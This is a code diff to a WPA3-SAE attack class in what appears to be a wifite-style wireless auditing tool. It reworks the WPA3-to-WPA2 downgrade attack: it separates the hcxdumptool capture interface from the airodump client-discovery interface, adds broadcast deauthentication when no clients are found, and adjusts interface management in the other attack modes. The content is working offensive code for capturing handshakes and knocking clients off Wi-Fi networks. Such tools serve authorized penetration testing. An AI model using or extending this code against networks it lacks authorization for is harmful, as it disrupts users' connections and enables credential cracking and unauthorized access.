@@ -757,6 +757,20 @@ class AttackWPA3SAE(Attack):
         return is_vulnerable
 
 
+    @staticmethod
+    def _downgrade_interfaces():
+        """Return (capture interface, airodump interface or None).
+
+        hcxdumptool must own its capture interface exclusively. airodump is
+        only started when a second radio is configured; otherwise client
+        discovery is skipped and deauth falls back to broadcast.
+        """
+        capture = Configuration.interface
+        secondary = getattr(Configuration, 'interface_secondary', None)
+        if secondary and secondary != capture:
+            return capture, secondary
+        return capture, None
+
     def attempt_downgrade(self):
         """
         Attempt to downgrade WPA3 connection to WPA2.
@@ -783,38 +797,49 @@ class AttackWPA3SAE(Attack):
         hcxdump = None
         airodump = None
         
+        capture_interface, airodump_interface = self._downgrade_interfaces()
+
         try:
             # Use hcxdumptool for capture to get pcapng format
             # This format properly supports both WPA2 and WPA3-SAE handshakes
-            hcxdump = HcxDumpTool(channel=self.target.channel,
+            hcxdump = HcxDumpTool(interface=capture_interface,
+                                  channel=self.target.channel,
                                   target_bssid=self.target.bssid,
                                   enable_deauth=False,  # We'll manually deauth
                                   pmf_required=False)
             hcxdump.__enter__()
-            
-            # Also start airodump for client detection
-            airodump = Airodump(channel=self.target.channel,
-                          target_bssid=self.target.bssid,
-                          skip_wps=True,
-                          output_file_prefix='wpa3_downgrade')
-            airodump.__enter__()
-            
+
+            # airodump must never share an interface with hcxdumptool.
+            if airodump_interface:
+                airodump = Airodump(interface=airodump_interface,
+                                    channel=self.target.channel,
+                                    target_bssid=self.target.bssid,
+                                    skip_wps=True,
+                                    output_file_prefix='wpa3_downgrade')
+                airodump.__enter__()
+            else:
+                Color.pl('{!} {O}No secondary interface: client discovery disabled{W}')
+                Color.pl('{!} {O}hcxdumptool keeps exclusive use of {C}%s{W}' % capture_interface)
+
             Color.clear_entire_line()
             Color.pattack('WPA3', self.target, 'Downgrade', 'Waiting for target to appear...')
-            
-            try:
-                airodump_target = self.wait_for_target(airodump)
-            except Exception as e:
-                Color.pl('\n{!} {R}Target detection failed:{W} %s' % str(e))
-                if self.view:
-                    self.view.add_log(f'Target detection failed: {str(e)}')
-                Color.pl('{!} {O}Possible causes:{W}')
-                Color.pl('    - Target out of range')
-                Color.pl('    - Wrong channel')
-                Color.pl('    - Target powered off')
-                return None
-            
-            self.clients = []
+
+            self.clients = list(getattr(self.target, 'clients', []) or [])
+
+            if airodump is not None:
+                try:
+                    airodump_target = self.wait_for_target(airodump)
+                    if airodump_target:
+                        self.clients = airodump_target.clients
+                except Exception as e:
+                    Color.pl('\n{!} {R}Target detection failed:{W} %s' % str(e))
+                    if self.view:
+                        self.view.add_log(f'Target detection failed: {str(e)}')
+                    Color.pl('{!} {O}Possible causes:{W}')
+                    Color.pl('    - Target out of range')
+                    Color.pl('    - Wrong channel')
+                    Color.pl('    - Target powered off')
+                    return None
 
             # Set timeout for the downgrade attempt. Honour --wpa3-timeout when
             # the user set it; otherwise keep a short 30s window — the downgrade
@@ -866,17 +891,18 @@ class AttackWPA3SAE(Attack):
                            (progress_pct, str(downgrade_timeout)))
                     last_progress_update = current_time
                 
-                # Get current clients
-                try:
-                    airodump_target = self.wait_for_target(airodump, timeout=1)
-                    if airodump_target:
-                        self.clients = airodump_target.clients
-                except Exception as e:
-                    # Target temporarily lost, continue
-                    pass
+                # Get current clients (airodump runs on a separate radio)
+                if airodump is not None:
+                    try:
+                        airodump_target = self.wait_for_target(airodump, timeout=1)
+                        if airodump_target:
+                            self.clients = airodump_target.clients
+                    except Exception:
+                        # Target temporarily lost, continue
+                        pass
                 
                 # Check if we have clients
-                if len(self.clients) == 0:
+                if airodump is not None and len(self.clients) == 0:
                     Color.pattack('WPA3', self.target, 'Downgrade',
                                  'Waiting for clients... (%s)' % downgrade_timeout)
                     
@@ -903,12 +929,17 @@ class AttackWPA3SAE(Attack):
                     
                     # Deauth all clients
                     deauth_success = False
-                    for client in self.clients:
+                    # Broadcast when client discovery is unavailable, so the
+                    # downgrade can still force reconnections.
+                    deauth_targets = list(self.clients) if self.clients else [None]
+                    for client in deauth_targets:
+                        client_mac = getattr(client, 'station', None)
+                        label = client_mac or '*broadcast*'
                         try:
-                            Aireplay.deauth(self.target.bssid, client_mac=client.station, num_deauths=5)
+                            Aireplay.deauth(self.target.bssid, client_mac=client_mac, num_deauths=5)
                             deauth_success = True
                         except Exception as e:
-                            Color.pl('{!} {O}Deauth failed for client %s: %s{W}' % (client.station, str(e)))
+                            Color.pl('{!} {O}Deauth failed for client %s: %s{W}' % (label, str(e)))
                             if self.view:
                                 self.view.add_log(f'Deauth error: {str(e)}')
                     
@@ -961,7 +992,10 @@ class AttackWPA3SAE(Attack):
             if not handshake:
                 Color.pl('\n{!} {O}Downgrade attack failed{W}')
                 
-                if len(self.clients) == 0:
+                if airodump is None:
+                    Color.pl('{!} {O}Failure reason: No secondary interface for client discovery{W}')
+                    Color.pl('{!} {O}Downgrade needs a second radio to track clients{W}')
+                elif len(self.clients) == 0:
                     Color.pl('{!} {O}Failure reason: No clients detected{W}')
                     Color.pl('{!} {O}Downgrade requires active clients{W}')
                 elif deauth_attempts == 0:
@@ -1046,7 +1080,8 @@ class AttackWPA3SAE(Attack):
             hcxdump = HcxDumpTool(channel=self.target.channel,
                             target_bssid=self.target.bssid,
                             enable_deauth=enable_deauth,
-                            pmf_required=pmf_required)
+                            pmf_required=pmf_required,
+                            manage_interface=not enable_deauth)
             hcxdump.__enter__()
             
             Color.clear_entire_line()
@@ -1235,7 +1270,8 @@ class AttackWPA3SAE(Attack):
             hcxdump = HcxDumpTool(channel=self.target.channel,
                             target_bssid=self.target.bssid,
                             enable_deauth=False,  # Passive mode
-                            pmf_required=True)
+                            pmf_required=True,
+                            manage_interface=True)
             hcxdump.__enter__()
             
             Color.clear_entire_line()
